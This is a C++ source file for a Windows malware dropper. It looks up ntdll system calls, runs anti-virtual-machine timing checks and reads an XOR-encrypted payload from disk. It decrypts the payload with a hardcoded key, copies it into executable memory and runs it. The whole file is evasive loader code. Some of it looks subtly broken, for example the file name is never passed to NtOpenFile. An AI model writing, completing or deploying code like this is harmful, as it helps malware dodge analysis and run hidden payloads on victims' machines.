#include <windows.h>
#include <iostream>
#include <vector>
#include <string.h>
#include <ntdef.h>
#include <winnt.h>
#include <ntstatus.h>
#include <winbase.h>
#include <tlhelp32.h>
#include "anti.h"

#pragma comment(lib, "ntdll.lib")

// Function declarations
extern "C" {
    typedef struct _IO_STATUS_BLOCK {
        union {
            NTSTATUS Status;
            PVOID Pointer;
        };
        ULONG_PTR Information;
    } IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

    typedef VOID (*PIO_APC_ROUTINE)(PVOID, PIO_STATUS_BLOCK, ULONG);

    typedef LONG(NTAPI* NtCreateMutex_t)(PHANDLE, ULONG, POBJECT_ATTRIBUTES);
    typedef LONG(NTAPI* NtOpenFile_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, ULONG, ULONG);
    typedef LONG(NTAPI* NtReadFile_t)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
    typedef LONG(NTAPI* NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    typedef LONG(NTAPI* NtFreeVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG);
    typedef LONG(NTAPI* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
    typedef LONG(NTAPI* NtUnmapViewOfSection_t)(HANDLE, PVOID);
}
// Dropper Logic
void dropper_logic() {
    // Declare system call function pointers
    NtCreateMutex_t NtCreateMutex;
    NtOpenFile_t NtOpenFile;
    NtReadFile_t NtReadFile;
    NtAllocateVirtualMemory_t NtAllocateVirtualMemory;
    NtFreeVirtualMemory_t NtFreeVirtualMemory;
    NtMapViewOfSection_t NtMapViewOfSection;
    NtUnmapViewOfSection_t NtUnmapViewOfSection;

    // Get the addresses of the system call functions (you could get this from ntdll)
    NtCreateMutex = (NtCreateMutex_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateMutex");
    NtOpenFile = (NtOpenFile_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenFile");
    NtReadFile = (NtReadFile_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadFile");
    NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    NtFreeVirtualMemory = (NtFreeVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory");
    NtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtMapViewOfSection");
    NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");

    // Check if system calls were successfully obtained
    if (!NtCreateMutex || !NtOpenFile || !NtReadFile || !NtAllocateVirtualMemory || !NtFreeVirtualMemory || !NtMapViewOfSection || !NtUnmapViewOfSection) {
        return; // If failed to get syscalls, exit
    }

    // 1. Mutex Creation - using NtCreateMutex syscall
    HANDLE hMutex = NULL;
    OBJECT_ATTRIBUTES objAttr = { 0 };
    NtCreateMutex(&hMutex, 0, &objAttr);
    if (hMutex == NULL) {
        return;
    }

    // 2. Download the payload (use NtOpenFile and NtReadFile syscalls)
    HANDLE hFile = NULL;
    IO_STATUS_BLOCK ioStatusBlock = { 0 };
    typedef VOID(NTAPI* RtlInitUnicodeString_t)(PUNICODE_STRING, PCWSTR);
    RtlInitUnicodeString_t RtlInitUnicodeString = (RtlInitUnicodeString_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
    UNICODE_STRING fileName;
    RtlInitUnicodeString(&fileName, L"\\??\\C:\\path\\to\\your\\payload");  // Provide actual path
    ULONG accessMask = GENERIC_READ;
    ULONG fileAttributes = FILE_ATTRIBUTE_NORMAL;
    ULONG shareAccess = FILE_SHARE_READ;
    ULONG openDisposition = FILE_OPEN_IF;
    ULONG createOptions = 0;
    NtOpenFile(&hFile, accessMask, &objAttr, &ioStatusBlock, shareAccess, createOptions);

    if (hFile == NULL) {
        return;
    }

    // Buffer for reading the file
    char buffer[1024];
    ULONG bytesRead = 0;
    std::vector<char> payload;

    // Read the payload from the file into the vector
    NtReadFile(hFile, NULL, NULL, NULL, &ioStatusBlock, buffer, sizeof(buffer), NULL, &bytesRead);
    payload.insert(payload.end(), buffer, buffer + bytesRead);

    // 3. XOR decryption (using hardcoded key)
    const char key[] = "S3cr3tK3y!";
    size_t keyLength = strlen(key);
    for (size_t i = 0; i < payload.size(); i++) {
        payload[i] ^= key[i % keyLength];
    }

    // 4. Allocate memory using NtAllocateVirtualMemory syscall
    PVOID pMemory = NULL;
    SIZE_T payloadSize = payload.size();
    NtAllocateVirtualMemory(GetCurrentProcess(), &pMemory, 0, &payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    if (!pMemory) {
        return; // Memory allocation failed
    }

    // 5. Copy the payload to the allocated memory
    memcpy(pMemory, payload.data(), payload.size());

    // 6. Execute the payload (treat the memory as executable code)
    typedef void (*tMain)();
    tMain pMain = (tMain)pMemory;
    if (pMain) {
        pMain();
    }

    // 7. Clean up - Free memory
    NtFreeVirtualMemory(GetCurrentProcess(), &pMemory, &payloadSize, MEM_RELEASE);
}

// Main function
int main() {
    int anomalies = 0;

    // Combine detection methods
    if (multiTimingDetection()) anomalies++;
    if (multiMathDetection()) anomalies++;
    if (tlbFlushDetection()) anomalies++;

    if (anomalies >= DETECTION_THRESHOLD) {
        std::cerr << "Anomaly detected" << std::endl;
        return 1;
    }

    std::cout << "No anomalies detected" << std::endl;

    // Dropper logic    
    try {
        dropper_logic();
    } catch (const AntiVMException& e) {
        std::cerr << "AntiVMException: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
